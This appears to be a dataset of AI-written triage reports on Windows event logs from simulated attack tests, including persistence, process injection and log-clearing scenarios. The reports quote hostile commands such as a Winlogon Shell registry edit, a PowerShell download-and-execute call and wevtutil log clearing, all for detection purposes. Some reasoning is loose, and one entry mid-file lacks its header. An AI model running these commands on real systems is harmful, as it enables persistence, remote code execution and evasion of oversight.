   - Multiple executions of `wevtutil.exe` and `conhost.exe` are recorded under the user `SERVER002\\admin_test`. While not inherently malicious, the heavy use of these processes during the time of interest may warrant further scrutiny, especially if the account `admin_test` does not usually perform such operations or if this is an account with elevated privileges not typically used for such tasks.

3. **Security and System Logs:**
   - The time modification entries found in the security logs (EventID: 4616) are typical of normal system operations related to synchronization with time servers and are usually benign.
   - However, a rapid succession of time changes (`OldTime` and `NewTime`) in the System logs is slightly unusual. Although it can happen naturally within milliseconds, some malware alters system time to evade detection or manipulate timestamps.

4. **Edge Update:**
   - Events related to Microsoft Edge Update are seen, which show dynamic interaction and updates being processed. These activities appear normal since they are initiated by `NT AUTHORITY\SYSTEM`, a legitimate account for system-level operations.

### Assessment

Overall, the logs show clear indicators of potentially malicious activity centered on the use of scripts (`jsestartup.jse`) executed via PowerShell, with the goal of automating operations at system startup. This behavior fits a classic pattern for persistence mechanisms used by malware.

### Resolution

**MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Response:**
   - Isolate the machine from the network to prevent potential spread or further compromise.
   - Suspend affected user accounts, especially if the `admin_test` account should not have elevated privileges.

2. **Forensic Investigation:**
   - Conduct a forensic analysis of the script (`jsestartup.jse`) and the payload it might be executing or delivering.
   - Investigate and analyse PowerShell history and logs for additional malicious commands.

3. **Containment and Eradication:**
   - Remove the malicious script from the startup and other suspicious files or payloads found on the system.
   - Patch any software vulnerabilities identified during the forensic investigation.
   - Review and tighten user account privileges and usage policies.

4. **Recovery and Incident Review:**
   - Restore the system from a clean backup once it is confirmed clean and secure.
   - Perform a robust review of the incident to identify gaps in detection and response, adjusting security implementations accordingly.

5. **Monitoring and Follow-up:**
   - Increase monitoring and logging on affected systems and network segments to detect any further suspicious activities early.
   - Educate the organization on the encountered threat vectors to increase awareness and prevent recurrence.

This detailed approach should help mitigate any current threat while providing a robust strategy for securing the organization against future incidents."
Winlogon Shell Key Persistence - PowerShell,"Based on the provided Windows Event Logs, I've performed an analysis focusing on potential indicators of malicious activity.

### Analysis of Logs:

1. **Application Logs:**
   - No significant suspicious activity detected. Normal operations like stopping of services (e.g., edge update) were observed.

2. **Security Logs:**
   - Events 4616 in the Security Log indicate the change of system time, which corresponds to normal system operations, usually performed by svchost.exe under LOCAL SERVICE. No direct indication of malicious activity here.

3. **System Logs:**
   - Events from Kernel-General and Time-Service suggest timezone or time updates, which appear consistent with other observations. The use of time.windows.com NTP service is normal for system time synchronization.

4. **Sysmon Logs:**
   - Multiple process creations such as `wevtutil.exe`, `conhost.exe`, `whoami.exe` and `powershell.exe`, initiated by the user `SERVER002\admin_test`.
   - The command lines for these processes (such as the execution of `hostname.exe` and `whoami.exe`) appear standard, typically employed for gathering system information and diagnostics. However, `powershell.exe` contains a potentially suspicious command:
     ```
     powershell.exe & {Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, C:\Windows\System32\cmd.exe"" -Force}
     ```
   - This command modifies the registry entry for user shell settings, which is suspicious as it could indicate a persistence mechanism alteration by an attacker to execute a different shell (cmd.exe) alongside explorer.exe on user logon.

5. **PowerShell Logs:**
   - Corroborate the Sysmon findings with the invocation of a PowerShell command to modify the shell registry key, which reinforces the suspicion of potential malicious activity.

### Assessment:

- **Suspicious Behavior:**
  - The use of PowerShell to change a registry setting related to the user logon shell is particularly concerning. This behavior is commonly associated with attempts to maintain persistence by running additional scripts or commands when users log in.

- **Potential Threat:**
  - The modification to the Winlogon Shell registry indicates unauthorized changes that could introduce risks such as persistent backdoor access, command execution, or deployment of additional unwanted software.

### Guidance and Resolution:

- **Immediate Actions:**
  - Confirm with the user (SERVER002\admin_test) or IT department if this registry change was authorized as a part of legitimate software updates or IT management activities.
  - Review recent user activity, installed applications, and any changes to scheduled tasks or startup items.
  - Run a comprehensive antivirus and malware detection scan on the affected machine.

- **Resolution:**
  - Given the suspicious PowerShell activity modifying registry settings for persistence, the final resolution is **MALICIOUS.**

This assessment concludes that there is evidence of potential unauthorized activity that requires further immediate investigation and remediation to avert any compromise or unintended system behavior."
LockBit Black - Modify Group policy settings -cmd,"### Detailed Analysis of the Provided Logs

#### General Observations:
- The EDR alert was triggered on the CEO's machine, which suggests high sensitivity and potentially critical implications.
- The logs essentially revolve around system processes and administrative actions, especially focused on system processes and potential changes to system configurations.

### Key Findings:

#### 1. **Time Synchronization Events:**
- **Kernel-General EventID 24 & 1** (System Log): These events indicate the system time was adjusted. Adjustments in system time can be legitimate, related to NTP synchronization, or can be a technique to evade detection by modifying timestamps.
- **Security EventID 4616**: Mirrors the above activity, showing time changes performed by the `svchost.exe` process.

#### 2. **Process Execution via Sysmon Logs:**
- Multiple **Sysmon EventID 1** entries were recorded. Key processes observed:
  - `wevtutil.exe` and `cmd.exe`: Invocation of `wevtutil.exe` is not inherently suspicious but could indicate log manipulation or querying. The command-line operations of `cmd.exe` involve registry changes which are atypical for regular user activity.
  - `reg.exe`: Registry changes were performed using `cmd.exe`, particularly targeting group policy settings and security configurations related to SmartScreen. The disabling of SmartScreen and suspicious registry edits raise flags about system settings being tampered with.

#### 3. **Potential Indicators of Malicious Activity:**
- **Pattern of Registry Changes**: The registry manipulations through `cmd.exe` hint at potentially malicious tampering with system settings. The command specifically targets group policy settings, likely with the intent to alter security policies or system behavior in a manner that could weaken the endpoint's defenses.
- **Use of Administrative Tools by 'admin_test'**: The `SERVER002\admin_test` account was used in changing registry settings, which although might be legitimate if performed by an admin, in the context of security logs, can indicate privilege escalation or unauthorized access.

#### 4. **Microsoft Edge Update Activity:**
- Updates related to Microsoft Edge are visible. These can be routine unless exploited by a process masquerading as or triggered by malicious software. There are a series of EdgeUpdate processes that look routine but should be cross-verified with recent Microsoft Edge scheduled updates due to potential impersonation of update service by malware.

#### Assessment:
- **SUSPICIOUS**: There's a pattern of suspicious activity, especially around registry changes and administrative tasks being run by potentially unauthorized means or non-standard timing. Their actions could signal an attempt at persistence, security policy bypass, or footprint removal.

### Guidance on How to Proceed:
1. **Compromise Assessment**: Conduct a more thorough investigation on `SERVER002\admin_test` actions and whether the registry edits were intentional and authorized.
2. **Check-in with System Owners**: Verify any legitimate administrative actions with system operators to confirm whether the observed activities align with normal operating procedures.
3. **Monitor Edge Update Processes**: Validate Microsoft Edge update timings against the organization's approved patching schedule.
4. **Integrity Check**: Conduct file integrity monitoring on critical files and settings to ensure they have not been altered maliciously.
5. **Audit and Harden Policies**: Review and, if necessary, tighten group policy and security configurations — especially those altered during this timeline.

**Resolution: SUSPICIOUS** — Further investigation is needed to confirm whether these activities were authorized and not indicative of a deeper compromise."
Domain Password Policy Check: Short Password,"Upon reviewing the provided logs, we need to assess if there is any suspicious or potentially malicious activity:

### Key Observations:

#### 1. PowerShell Activity:
- The PowerShell logs indicate multiple PowerShell scripts attempting to manipulate user password credentials. Specifically, users of `ConsoleHost` are using PowerShell to access and manipulate a file containing user credentials (`$env:LOCALAPPDATA\\file\\$env:USERNAME.txt`).
- The script checks if the current user's password matches a stored password (""Uplow-1"") and attempts to change the Active Directory account password (`Set-ADAccountPassword`). This type of behavior is rather unusual for routine administrative tasks and might suggest unauthorized password manipulation or an attempt to establish persistence via credential access.

#### 2. Sysmon Activity:
- Frequent and close execution of system utilities like `wevtutil.exe` and `conhost.exe` as `SERVER002\admin_test` user, interspersed with PowerShell execution, is being observed. While these processes themselves might not be inherently suspicious (as they are legitimate Windows binaries), their execution in tandem with PowerShell credential manipulation could indicate system enumeration or preparatory steps for privilege escalation.
- The execution of `whoami.exe` suggests there was an effort to verify the current user's identity, which can be a part of recon efforts to understand the compromised account’s privileges.
- The execution of `powershell.exe` directly correlates with the anomalous PowerShell activity observed and thus strengthens concerns regarding potential misuse.

### Assessment:
- **Indicators of Malicious Activity:**
  - Access and manipulation of user credential files.
  - Attempted changes to user account passwords without clear, legitimate context.
  - Repeated use of system utilities (`HOSTNAME.EXE`, `wevtutil.exe`) which often accompany penetration testing or malicious strategies for system information gathering or event log manipulation efforts.

### Conclusion: 
These activities indicate a sophisticated use of legitimate tools to potentially mask malicious actions. Without additional context on whether these actions were authorized or a known script, the combination of PowerShell scripts that manipulate credential files and password, especially related to key enterprise figures like the CEO, points towards potential unauthorized access attempts.

### Resolution:
- **SUSPICIOUS** - The logs contain activities that are suspicious and require further investigation to fully assess intent and verify whether these actions were indeed part of authorized administrative tasks or an indicator of compromise. 

### Recommended Action:
1. **Immediate Actions:**
   - Verify with the IT/security team if there were legitimate administrative tasks or changes scheduled that utilized the detected PowerShell scripts and commands.
   - Check for additional logs or alerts from other security appliances that might shed more light on the context of these activities.

2. **Further Investigation:**
   - Review access control logs for other unusual access, especially around the time of these incidents.
   - Conduct a thorough audit for any unauthorized changes to user accounts and system settings.
   - Isolate and analyze the affected machine(s) for any unknown running processes or backdoors.

3. **Preventive Measures:**
   - Strengthen monitoring around PowerShell activities, especially those related to credential access and changes.
   - Employ least privilege principles and limit access to systems to only those necessary for users' job functions.
   - Consider deploying more granular audit logging and establishing alert thresholds for sensitive account manipulations.

It is crucial to act swiftly and ensure thorough analysis to safeguard the organization against potential breaches."
Allowing custom application to execute during new RDP logon session,"The logs provided show several alerts of varying potential significance that need to be examined to assess whether they indicate benign, suspicious, or malicious activity:

1. **Security and Sysmon Logs:**
   - **EventID 4624:** This indicates successful logon events. These are frequent and mostly show `SYSTEM` or `SERVICE` logons which are typical for background services and tasks initiated by the system.
   - **EventID 4672:** Indicates that a privileged account logged on. Notably, it has quite a range of high-level privileges which could be dangerous if misused. Privilege listings for `SYSTEM` are typical but may need more scrutiny if initiated by non-regular activities.
   - **EventID 4798 & 4799:** These indicate enumeration of local group memberships and are somewhat common in routine operations but should not be overly frequent. An enumeration by `CompatTelRunner.exe` might require further investigation.
   - **EventID 1 in Sysmon:** Several instances of process creation are seen—especially `cmd.exe` with suspicious command lines that might alter the system behavior, such as running a command to add a registry key for startup (`reg add`).

2. **Application Log:**
   - **Software Protection Platform Service Events:** Routine checks and updates by the `sppsvc.exe` might explain some license validations—which could be normal system operations.

3. **PowerShell Logs:**
   - Execution of PowerShell with restricted execution policies seems suspicious because these policies could be preventing scripts from running altogether. The presence of both benign commands (e.g., `Write-Host 'Final result: 1';`) and potentially dubious scripts related to registry checks shows mixed activity requiring additional context.

4. **Indicators of Malicious Intent:**
   - The `cmd.exe` command observed in the Sysmon logs with arguments that modify registry entries (`reg add`) to potentially schedule unwanted programs (`calc`) to run at startup might indicate a persistence mechanism typically used by malware.
   - Presence of tools like `CompatTelRunner.exe` executing multiple tasks linked to telemetry and compatibility data assessments could be benign, but in some network environments, this activity can be scrutinized if uncommon.

**Conclusion:**
Based on an analysis of the provided logs, there are certain activities that could be indicative of suspicious behavior, particularly those involving command-line executions altering startup procedures and group enumeration that require further investigation to ascertain threat levels.

**Resolution: SUSPICIOUS**
- There is evidence that some activities are unusual or unnecessary for a typical system operation environment. Further investigation should include checking for other signs of unauthorized system modifications, correlating these logs with network activities, and validating all user-initiated tasks to ensure legitimacy. Consider in-depth scrutiny of the origin and context of these outlined activities, especially around the observed command line modifications."
WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique,"### Analysis of the Logs:

#### System Logs:
- The system logs primarily contain information related to time adjustments and svchost.exe activities. These particular entries suggest the system time was adjusted backward slightly and then forward, which could be expected behavior from legitimate time synchronization services.

#### Security Logs:
- Security logs consistently show changes in system time related to svchost.exe. The user involved is `LOCAL SERVICE`, operating under the `NT AUTHORITY`. The timestamps correspond with typical time service activities, and nothing appears malicious here in isolation.

#### Application Logs:
- There is not much direct evidence of suspicious activity in the application logs. Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`).

#### PowerShell Logs:
- These logs show several PowerShell activities with the `DownloadString` method directly fetching and executing a script from an external URL (GitHub). This behavior is highly suspicious, as it often indicates an attempt to execute potentially malicious code from an external source, typically seen in fileless malware attacks or when a user unknowingly triggers a malicious script.

#### Sysmon Logs:
- The Sysmon logs capture a range of typical system process activities. However, the entries showing PowerShell executed with specific CommandLine arguments to download scripts from an external URL, as logged in PowerShell logs, are extremely concerning.
- Execution of common reconnaissance commands like `whoami` and `hostname` can be considered suspicious when they occur without apparent reason on its own. However, paired with the PowerShell execution, it indicates an evaluation of the environment by potentially malicious code.

### Assessment:

- **Anomalies Detected:** The primary anomaly is the PowerShell execution fetching and attempting to run scripts from `raw.githubusercontent.com`. This behavior is a common tactic used in cyber-attacks to obfuscate and launch malicious activities without needing a file on disk.
- **Potentially Malicious Indicators:** The usage of `iex(new-object net.webclient).downloadstring` is a red flag since it suggests the execution of content directly over the web, which is a potential attack vector.
- **Risk Level:** High - due to the potential execution of remote scripts using PowerShell from an untrusted source, indicating possible system compromise or attempted compromise.

### Resolution:

- **MALICIOUS:** The PowerShell activity observed in the logs, involving the execution of downloaded scripts from an external website, alongside suspicious reconnaissance and potential enumeration activities, indicates malicious activity with high certainty.

### Guidance:

1. Immediately isolate the affected host (in this case, the CEO's machine) to prevent further potential exposure and lateral movement within the network.
2. Investigate other systems for similar activities that may indicate lateral movement or other attempted compromises.
3. Conduct a thorough forensic analysis on the isolated host to determine the full scope and impact of the attack.
4. Review and apply any necessary security patches or configurations to prevent exploitation via similar vectors in the future.
5. Consider employee awareness training on the dangers of executing untrusted code, particularly those involving PowerShell.
6. Implement stricter PowerShell execution policies and consider using monitoring solutions that can detect similar script execution patterns."
HKLM - Add atomic_test key to launch executable as part of user setup,"Based on the provided logs, let's analyze the events to identify any suspicious or malicious activities:

### PowerShell Log Analysis
1. **Registry Manipulation:**
   - Repeated entries show the use of PowerShell to create a registry entry under `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components` with a new component named ""file_test"".
   - The `StubPath` for this entry points to `C:\Windows\System32\calc.exe`.
   - Execution of `runonce.exe` with the `/AlternateShellStartup` argument is observed in the command line.
   - This behavior suggests persistence mechanisms or preparation for executing something at the next login.
   - Calculator (`calc.exe`) is a benign application, but its use here raises questions about the intent behind setting up such registry entries.

### Sysmon Log Analysis
1. **Process Activity:**
   - A sequence of `wevtutil.exe` and `conhost.exe` processes is observed under the user `SERVER002\admin_test`, primarily around 17:13:49, which seems like a typical usage pattern perhaps related to system management or scripting.
   - A PowerShell execution (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) is linked to modifying registry settings, consistent with the PowerShell logs observed.
   - A `runonce.exe` followed by a `calc.exe` execution is recorded, confirming the PowerShell script was indeed executed.
   
2. **Microsoft Edge Update Processes:**
   - Multiple processes related to Microsoft Edge Update are visible, involving activities like service registration and updates. These appear consistent with expected update operations by Microsoft Edge.

### Security Log Analysis
- The logs at 17:14:08 mention setting changes related to time synchronization (`EventID: 4616`). These could be benign but should be monitored in conjunction with other suspicious activities.

### System Log Analysis
- Similar time change events (`EventID: 1`) confirming the synchronization events seen in the Security Log.

### Application Log Analysis
- Stoppage of edge update services, seemingly following expected update cycles with no immediate suspicious context.

### Assessment
The primary concern arises from the PowerShell script's intent to use registry entries for launching a system executable (`calc.exe`). This action is commonly seen in initial phases of malware setups for persistence or as a placeholder to verify steps are working, indicating malicious intent.

**Final Assessment: MALICIOUS**
- **Reason:** The scripting activities associated with registry manipulation by PowerShell and the subsequent execution of `runonce.exe` and `calc.exe` suggest attempts to establish persistence on the system. Although `calc.exe` is benign, its usage pattern here is uncommon outside of testing or malicious activities.

### Guidance on How to Proceed
1. **Immediate Isolation:** Isolate the affected machine to prevent any potential spread of malicious activity.
2. **Registry Cleanup:** Remove the suspicious registry entries created under `HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components`.
3. **Comprehensive Scan:** Perform a full antivirus/malware scan to identify any further infections or tampering.
4. **Audit Logs:** Conduct an audit of system logs to identify any other affected systems or similar patterns indicating compromise.
5. **Notification and Review:** Reporting to the Incident Response Team for further investigation and remediation, and review user account activities, especially that of `SERVER002\admin_test`.
6. **Enhance Monitoring:** Increase monitoring on similar patterns of registry changes and PowerShell script executions across the network.

This detailed investigation indicates a high risk of malicious activity requiring immediate remediation and further analysis to prevent recurrence."
Read-Write-Execute process Injection,"## Analysis:

### Suspicious Behavior:
1. **Frequent Use of Sysmon Event ID 5**: The logs show numerous Sysmon Event ID 5 entries which indicate process termination. Observing multiple terminations of `conhost.exe` and `wevtutil.exe` around the same time, especially with the user `SERVER002\admin_test`, could be indicative of an activity attempting to conceal tracks or manipulate logs.

2. **PowerShell Activities**:
    - **PowerShell Execution**: A critical observation is the execution of PowerShell with the command:
      ```powershell
      ""powershell.exe"" & {$address = (& ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\searchVuln.exe"" ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value, & ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\RWXinjectionLocal.exe"" ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\vuln_dll\msys-2.0.dll"" $address}
      ```
    - This script appears to execute potentially malicious files (`searchVuln.exe` and `RWXinjectionLocal.exe`) located within the `Temp` directory, which is often used to deploy malicious payloads. The script’s behavior of extracting information from one executable and possibly injecting it with another is concerning and may indicate an attempt at privilege escalation or code execution in a suspicious way.

3. **Processes Chain**:
    - **`WindowsPowerShell\powershell.exe` followed by executable from Temp**: The chain of events indicates Potential Unauthorized PowerShell scripts execution and DLL injection attempts. Leveraging `powershell.exe` for such activities is a common tactic used in cyber attack methodologies.

4. **High Integrity Level**:
    - These processes are running at a ""High"" Integrity Level, implying elevated permissions, which adds to the risk factor if such scripts are malicious.

### Malicious Indicators:
- Execution of suspicious scripts or executables from temporary directories.
- Use of complex command-line arguments in PowerShell indicative of potentially malicious behavior (e.g., scripting with variable injection).
- The observed behavior of file interactions and executions indicates an attempt to exploit vulnerabilities or perform unauthorized actions on the machine.

### Assessment:
Based on the process creation details, command-line arguments, and environment settings extracted from the logs coupled with Microsoft guidelines and known tactics, the activities detailed are concerning and go beyond benign use cases. The level of PowerShell scripting activity, involving known risky practices (e.g., using encoded commands and extraction of potential addresses from files), points towards illicit intent.

### Resolution: **MALICIOUS**

## Recommendations:
- **Immediate Containment**: Isolate the host (SERVER002) to prevent any further propagation of the potential threat.
- **Detailed Forensic Analysis**: Conduct a thorough forensic investigation of the files and executables involved, especially `searchVuln.exe` and `RWXinjectionLocal.exe` in the Temp directory.
- **Log for Backdoors/Trojans**: Scan the host for any unauthorized access or persistence mechanisms that may have been implemented.
- **User Activity Review**: Analyze recent activities performed by `SERVER002\admin_test` to understand any discrepancies.
- **Strengthen Security Posture**: Review security policies around PowerShell scripting and consider hardening measures such as using Constrained Language Mode or implementing Just Enough Administration (JEA).
- **Patch Security Exploits**: Ensure all systems are updated with patches to address any exploited vulnerabilities."
Scheduled task Remote,"**Detailed Analysis:**

Upon review of the provided logs, several potentially suspicious activities warrant further investigation:

1. **Time Change Logs** (Security and System Logs):
   - Events show repeated changes in the system time (Event ID 4616 & 1). The time was adjusted backward multiple times, which could be an attempt to alter timestamps to evade detection or logs timestamp manipulation.

2. **Schedule Task Creation** (Sysmon Logs):
   - A command executed via cmd.exe to create a scheduled task using `SCHTASKS` is recorded (Event ID 1). The task seems to execute cmd.exe daily, which could be used to maintain persistence on a compromised system. The use of `/RP At0micStrong` for password in plain text raises flags for potential malicious intent.

3. **Use of Administrative Tools by Unknown User** (Sysmon Logs):
   - There are multiple instances of administrative tools such as `wevtutil.exe`, `conhost.exe`, and `hostname.exe` being executed by a user `SERVER002\\admin_test`. Without context, such executions could lead to malicious activities, especially if the `admin_test` user is not recognized or should not have these privileges. This could be an indicator of lateral movement or privilege escalation attempts.

4. **Execution of `whoami.exe`** (Sysmon Logs):
   - The execution of `whoami.exe` is not inherently malicious, but it indicates someone attempting to gather information on the current user’s context, which could signify reconnaissance activity.

5. **Process Execution with High Integrity Level**:
   - Several processes, including `cmd.exe` and `schtasks.exe`, executed with high integrity levels mean potential elevated privileges that an attacker might use to perform administrative tasks or to bypass certain security restrictions.

**Assessment:**

The combination of altered system times, scheduled task creation, usage of administrative utilities, and command execution with high privileges indicate a likelihood of suspicious or potential malicious activity within these logs. Specifically, the creation of a schtask with a password in plain text is particularly concerning as it indicates a clear method of persistence.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Further Investigation:**
   - Validate the legitimacy of the `SERVER002\\admin_test` account. Check whether such account activities are authorized or expected.
   - Investigate any potential changes made using these scheduled tasks and confirm no unauthorized activities were done.
   - Conduct further scrutiny into the time set events; correlate them with intended system changes or administrative tasks.

2. **Security Recommendations:**
   - Immediate review of user accounts and their permissions on `Server002`.
   - Audit the scheduled tasks and remove or modify any unauthorized ones.
   - Use Event Logs to correlate other entries and anomalies related to the identified suspicious activities.
   - Implement monitoring for use of scheduled tasks and sensitive command-line operations.

3. **Containment & Remediation:**
   - If any actions are deemed unauthorized, containment measures should be initiated to prevent further potential compromise while a more comprehensive investigation is undertaken.
   - Review and strengthen authentication mechanisms, such as multi-factor authentication for accounts with administrative privileges. 

Given these points, the activity is classified as suspicious, requiring immediate attention but not conclusively malicious without further context and investigation."

- **Event ID 4672**: Indicates special privileges are assigned to `admin_test`, which could indicate normal administrative tasks or misuse of privileges.

#### **3. System Log**
- The entries reveal system time changes by `svchost.exe`, aligning with the entries in the Security log. Isolated, these could be benign; if occurring unexpectedly, further investigation is advised.
  
#### **4. Sysmon Log**
- **Event ID 5**: Shows usage of `wevtutil.exe` and `conhost.exe` by `admin_test`. These tools are legitimate but can be used for malicious purposes (log manipulation, unauthorized access, etc.).
- **Event ID 1**: There's a PowerShell activity indicating a script execution that tries to spawn a process `InjectView.exe`, which is suspicious. Such actions often point to lateral movement or malware installation attempts, especially if scripts are executed in unusual contexts.

#### **5. Windows PowerShell Log**
- The logs indicate PowerShell execution (`powershell.exe & {$notepad = Start-Process notepad -passthru; Start-Process ""C:\\...\\InjectView.exe""}`), which suggests potentially malicious activity given its attempt to invoke and execute a binary (`InjectView.exe`). 

### **Assessment and Risks**
The logs represent a series of events that flag potential malicious activity. The combination of time modification activities without a clear reason, privilege use, and scripting activities to execute unknown binaries are indicators of possible compromise and warrant concern. This activity is especially suspicious when viewed in the context of a high-value target like a CEO's machine.

### **Guidance on How to Proceed**
- **Immediate Investigation**: Confirm if the observed PowerShell activity and the execution of `InjectView.exe` were authorized.
- **Anomaly Detection**: Correlate these logs with other security tools (EDR, AV logs) to identify concurrent anomalies or threats.
- **Validation**: Check any changes made by users matching the accounts seen in the logs to verify legitimacy and intent.
- **System Review**: Conduct a thorough review of system integrity and any changes to critical system files or settings.

### **Resolution**
- **MALICIOUS**: Based on these findings related to the execution of potentially harmful PowerShell scripts and unapproved software execution, the logs indicate malicious activity warranting immediate escalation, incident response, and containment actions."
EarlyBird APC Queue Injection in Go,"Upon examining the provided event logs, several activities warrant closer scrutiny to determine if there's any malicious behavior.

### Analysis

1. **High-Integrity Level Processes**
   - The logs show multiple executions of **conhost.exe** and **wevtutil.exe** being run by the user **SERVER002\\admin_test**. While both are legitimate Windows processes, frequent and rapid executions in such a short timeframe can be regarded as suspicious, particularly if they are not a part of routine administrative tasks.

2. **Execution of Hostname.exe and Whoami.exe**
   - These executables ran normally under the context of the user **SERVER002\\admin_test**. While using `hostname.exe` and `whoami.exe` aren't inherently malicious actions, they're often run by system enumerators during reconnaissance phases by an attacker, unless they are part of legitimate administrative procedures.

3. **Suspicious PowerShell Activity**
   - The presence of a PowerShell command running **EarlyBird.exe** with an unusual path (**C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\bin\\x64\\EarlyBird.exe -program ""C:\\Windows\\System32\\werfault.exe"" -debug**) is especially concerning. The `EarlyBird.exe` is not a known system tool, and usage of PowerShell with scripts pointing to temporary locations is often indicative of malicious activities such as fileless malware attacks.

4. **Sysmon Logs**
   - The Sysmon logs capture the rapid execution of multiple processes like **wevtutil.exe**, **conhost.exe**, and **werfault.exe**. The use of **wevtutil.exe** can indicate potential attempts to manipulate or clear event logs, which is a common tactic to cover tracks.
   
5. **Security Logs & Privilege Escalation**
   - The logs indicate multiple privilege escalations with processes acquiring high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. This can be a sign of privilege escalation attempts by unauthorized users.

6. **Time Anomaly**
   - There are logs indicating a time change; however, it is not erroneous unless deliberate time manipulation for log evasion is determined, which cannot be validated just with these entries.

### Assessment

Based on the logs analyzed, there is evidence of potentially suspicious behavior. The execution of an unknown executable via PowerShell, the frequent process creations, and usage of certain utilities could indicate malicious activities. However, without further evidence from additional logs or supporting context, we cannot definitively label this activity as malicious.

### Resolution: SUSPICIOUS

**Guidance/Next Steps:**
- Conduct a deeper investigation to comprehend the context and intent of the PowerShell command and **EarlyBird.exe** 
- Verify with IT staff or the user **SERVER002\\admin_test** about any legitimate administrative tasks that may have required these processes.
- Use threat intelligence sources to check for reported malicious use of **EarlyBird.exe** and similar filenames.
- Monitor network traffic and endpoint behavior for any signs of compromise related to these findings.
- Review and ensure security controls like EDR policies are active and tuned to detect these types of activities."
Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"Upon reviewing the provided event logs, several indicators point toward potentially malicious activity:

1. **Suspicious PowerShell Activity**: 
   - In the Windows PowerShell log, there are events indicating the creation of a new provider state and registry modifications. The command involves modifying the `Security Packages` registry key and storing values into `AtomicTest.dll`, which is not a standard operation for PowerShell and can be indicative of a DLL injection attempt or privilege escalation tactic. Modifying the LSA (Local Security Authority) configuration like this is a red flag, as it can manipulate security policies.

2. **Log Cleared Events**:
   - The system logs show that event logs for Application, System, and PowerShell channels were cleared by a user named `admin_test`. This action is highly suspicious as attackers often clear logs to cover their tracks after executing malicious actions.

3. **Use of System Utilities for Log Manipulation**:
   - The sysmon logs indicate the execution of `wevtutil.exe` with commands to clear specific event logs (`cl Application`, `cl System`, and `cl Security`). This utility is commonly abused by attackers to delete event logs, hiding their malicious activities.

4. **Time Discrepancies in Security Logs**:
   - There is an unusual alteration of system time as seen in the Security log with Event ID 4616. Changing system time can be another tactic to confuse forensic investigations by altering the event timeline.

5. **Software Protection Platform (SPP) Execution**:
   - The Application log notes the execution of the Software Protection Platform Service (`sppsvc.exe`). While legitimate, in the context of other suspicious activities, this process could be reviewed further for its command-line usage and behavior.

6. **Privilege Level and Integrity**:
   - Various processes, including tasks performed by the user `admin_test`, execute at a high integrity level, which might suggest privilege escalation or exploitation of privileged access.

**Summary**: 
The analyzed logs show a sequence of activities that are indicative of malicious intent or, at minimum, unauthorized and suspicious behavior. The combination of registry modifications to sensitive security settings, clearing of event logs, use of system tools for potential log deletion, and discrepancies in system time adjustments suggest an attempt to perform actions undetected and potentially with elevated privileges.

**Resolution**: **MALICIOUS** 

**Recommendations**:
- Immediately isolate the affected machine (Server002) from the network to prevent any potential lateral movement.
- Perform a thorough forensic analysis of the machine to determine the extent of the compromise, especially focusing on persistence mechanisms like the modified LSA configuration.
- Change all credentials used on this machine, particularly `admin_test`, as they may have been compromised.
- Enhance monitoring and logging policies to detect similar behaviors in the future and ensure that event log retention is enforced to prevent attacks on logs from going unnoticed."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"Based on the analysis of the provided event logs, the following observations can be made:

1. **Security Log Observations:**
   - There are multiple logon events (Event ID 4624) for the SYSTEM account using a Logon Type 5, which indicates a service start. This by itself is generally normal for scheduled tasks or services.
   - We have privilege assignment (Event ID 4672) for SYSTEM. This typically assigns special privileges to a logon session, which is expected for the SYSTEM account.
   - Credential validation failures (Event ID 5379) with a Return Code of `3221226021`, which can be associated with a rejected network credential validation attempt. This might indicate incorrect credentials, but the context in these logs doesn't provide enough clarity.

2. **Sysmon Log Observations:**
   - **Whoami and Conhost.exe Processes:** Frequent execution of `whoami.exe` and `conhost.exe` from the `admin_test` user context. `whoami.exe` was initiated by `wsmprovhost.exe`, indicating a possible remote PowerShell session.
   - **PowerShell Execution:** The command line associated with `powershell.exe` is attempting to execute `NtQueueApcThreadEx.exe` with `-debug` flag from a suspicious path within `AppData\Local\Temp`. This behavior is characteristic of potential malware attempting to leverage advanced debugging or threading manipulation, signifying an attempt to execute arbitrary code.
   - **Repeated Process Creation:** Multiple executions of `wevtutil.exe` under `admin_test` could indicate attempts to tamper with event logs, possibly masking malicious activity.
   - Other processes like Microsoft Edge updates and telemetry activities appear legitimate.

3. **PowerShell Log Observations:**
   - A consistent pattern of PowerShell activity aligns with the suspicious `NtQueueApcThreadEx.exe` execution, showing that PowerShell was indeed invoked with potentially malicious intent.

**Assessment:**
- **Suspicious Activity:** The use of `powershell.exe` to execute a potentially malicious executable from a temporary location using concealed commands is highly suspicious and warrants further investigation. Executables in temporary directories are often associated with malicious activity, especially when coupled with executable names like `NtQueueApcThreadEx.exe`.
- **Potential Log Tampering:** Usage of `wevtutil.exe` suggests possible attempts to modify or clear event logs, which is consistent with activities intending to cover tracks after a system compromise.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected system (Server002) from the network to prevent further spread or data exfiltration.
- Perform a detailed forensic analysis on the system, particularly focusing on the process and parent process chains involving `wsmprovhost.exe` and `powershell.exe`.
- Review and potentially restore any tampered logs to comprehend the full scope of activities performed.
- Scan the system with updated antivirus and anti-malware tools and consider a full system restoration from a clean backup.
- Implement stricter monitoring and logging policies to detect and prevent similar activities in the future. Consider employing application whitelisting to prevent execution of unknown or untrusted executables."
Winlogon Userinit Key Persistence - PowerShell,"Upon analyzing the provided Windows event logs, here are the findings:

1. **Suspicious PowerShell Activity:**
